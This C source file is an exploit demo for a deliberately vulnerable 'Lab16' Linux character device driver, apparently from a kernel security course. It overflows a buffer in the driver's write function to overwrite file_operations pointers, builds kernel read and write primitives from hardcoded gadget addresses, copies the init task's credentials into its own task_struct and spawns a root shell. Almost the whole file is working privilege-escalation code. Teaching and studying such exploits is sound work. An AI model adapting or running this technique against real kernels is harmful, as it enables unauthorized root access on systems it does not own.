/*
 * Exploit demo for Lab16 character device driver.
 *
 * This demo exploits a buffer overflow condition in the
 * my_write function of Lab16 to overwrite the file_operations
 * function pointers. We use the overwrites to read the cred
 * pointer from systemd's task_struct and overwrite the cred
 * pointer in our own task_struct to elevate privileges to
 * those of systemd.
 *
 * Source code of Lab16 may require moving the buffer to the
 * other side of the file_operations structure, such that
 * an overflow out of the buffer will overwrite the f_ops.
 * 
 * Note:
 *      Use /proc/kallsyms to obtain addresses in the currently
 *      running kernel.
 *
 *      Lack of cleanup could cause issues after exit.
 */

#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <asm/unistd_64.h>

static unsigned long load_from_rsi = 0xffffffff81092e55UL;
static unsigned long store_rsi_to_r8 = 0xffffffff813d0ed0UL;
static unsigned long find_task_by_vpid = 0xffffffff810aedb0UL;
static unsigned long my_write = 0xffffffffc056e0d0UL;

static int fd;

static struct {
    char pad[96];
    unsigned long owner;
    unsigned long llseek;
    unsigned long read;
    unsigned long write;
    unsigned long aio_read;
    unsigned long aio_write;
    unsigned long readdir;
    unsigned long poll;
    unsigned long unlocked_ioctl;
    unsigned long compat_ioctl;
    unsigned long mmap;
    unsigned long open;
    unsigned long flush;
    unsigned long release;
    unsigned long fsync;
    unsigned long aio_fsync;
    unsigned long fasync;
    unsigned long lock;
    unsigned long sendpage;
    unsigned long get_unmapped_area;
    unsigned long check_flags;   
} pwndata;


static void setfn(unsigned long fn)
{
    pwndata.llseek = fn;
    pwndata.write = my_write;
    pwndata.check_flags = find_task_by_vpid;
    write(fd, &pwndata, sizeof(pwndata));
}


// rdi, rsi, rdx, rcx, r8, r9, r10
static unsigned long kern_load(unsigned long addr)
{
    setfn(load_from_rsi);
    return syscall(__NR_lseek, fd, addr, 0);
}


static void kern_store(unsigned long value, unsigned long addr)
{
    setfn(store_rsi_to_r8);
    syscall(__NR_lseek, fd, value, 0, 0, addr);
}


int main(int argc)
{
    unsigned long task_init;
    unsigned long task_self;
    unsigned long cred_init;

    fd = open("/dev/my_device", O_RDWR);

    setfn(load_from_rsi);

    task_init = fcntl(fd, F_SETFL, 1) | 0xffff8800UL << 32;
    printf("init task @ %p\n", task_init);

    task_self = fcntl(fd, F_SETFL, getpid()) | 0xffff8800UL << 32;
    printf("self task @ %p\n", task_self);

    cred_init = kern_load(task_init + 0x670) | 0xffff8800UL << 32;
    printf("init cred @ %p\n", cred_init);

    kern_store(cred_init, task_self + 0x670);

    close(fd);

    system("/bin/sh");

    return 0;
}
